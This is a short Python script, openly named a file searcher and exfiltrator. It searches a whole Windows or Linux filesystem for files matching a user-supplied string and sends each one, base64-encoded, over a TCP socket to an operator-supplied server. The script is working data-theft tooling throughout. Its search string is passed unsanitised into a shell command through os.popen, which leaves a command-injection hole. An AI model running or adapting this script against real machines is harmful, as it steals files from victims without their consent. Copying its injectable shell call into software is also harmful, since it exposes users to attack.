import os
import queue
import socket
import base64
import platform



print('File searcher and exfiltrator running! :)')
try:
    input = raw_input
except NameError:
    pass
    
server_host=input('Enter Server IP:\n')
server_portstring=input('Enter Server Port:\n')
server_port=int(server_portstring)
searchinput=input('Enter the search string of the file or files to search and exfiltrate:\n')

if 'Windows' in platform.system(): 
    dircmd='dir /a /s /b C:\*%s*' % searchinput
    data=os.popen(dircmd)
elif 'Linux' in platform.system():
    findcmd="find / -name *%s* -type f 2>/dev/null" % searchinput
    data=os.popen(findcmd)
else:
    print("OS not found")

print("Searching for files with %s in the name or extension" % searchinput)
paths=queue.Queue()



for line in data:
	paths.put(line.rstrip())

def exfiltrate(filepath) :
	client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	client.connect((server_host,server_port))
	try:
	    fd=open(filepath,'rb')
	    filedata=fd.read()
	    filedatab64=base64.b64encode(filedata)
	    filedatadecoded=filedatab64.decode()
	    filename=os.path.basename(filepath)
	    filedata2=filename+','+filedatadecoded
	    filedata3=filedata2.encode()
	    print("Downloaded %s" % filepath)
	    client.send(filedata3)
	    client.close()
	except:
	    pass
	

while not paths.empty():
	path=paths.get()
	exfiltrate(path)
